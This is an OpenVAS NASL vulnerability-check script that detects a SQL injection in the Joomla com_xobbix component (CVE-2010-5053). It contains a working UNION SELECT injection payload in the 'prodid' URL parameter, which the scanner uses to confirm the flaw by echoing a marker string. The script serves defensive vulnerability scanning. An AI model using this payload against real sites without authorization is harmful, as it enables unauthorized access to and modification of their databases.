###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_joomla_39259.nasl 13 2013-10-27 12:16:33Z jan $
#
# Joomla! 'com_xobbix' Component 'prodid' Parameter SQL Injection Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "The 'com_xobbix' component for Joomla! is prone to an SQL-injection
vulnerability because it fails to sufficiently sanitize user-supplied
data before using it in an SQL query.

Exploiting this issue could allow an attacker to compromise the
application, access or modify data, or exploit latent vulnerabilities
in the underlying database.";


if (description)
{
 script_id(103355);
 script_bugtraq_id(39259);
 script_cve_id("CVE-2010-5053");
 script_version ("$Revision: 13 $");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_tag(name:"risk_factor", value:"High");
 script_name("Joomla! 'com_xobbix' Component 'prodid' Parameter SQL Injection Vulnerability");

desc = "
 Summary:
 " + tag_summary;

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/39259");

 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2011-12-05 12:01:34 +0100 (Mon, 05 Dec 2011)");
 script_description(desc);
 script_summary("Determine if installed Joomla is vuolnerable");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
 script_dependencies("joomla_detect.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_keys("joomla/installed");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("version_func.inc");
   
port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

if( ! dir = get_dir_from_kb(port:port, app:"joomla"))exit(0);

url = string(dir, "/index.php?option=com_xobbix&catid=31&task=prod_desc&prodid=-21+union+select+1,2,3,4,0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374,6,7,8,9,10,11,12,13,14,15,16--"); 

if(http_vuln_check(port:port, url:url,pattern:"OpenVAS-SQL-Injection-Test")) {
     
  security_hole(port:port);
  exit(0);

}

exit(0);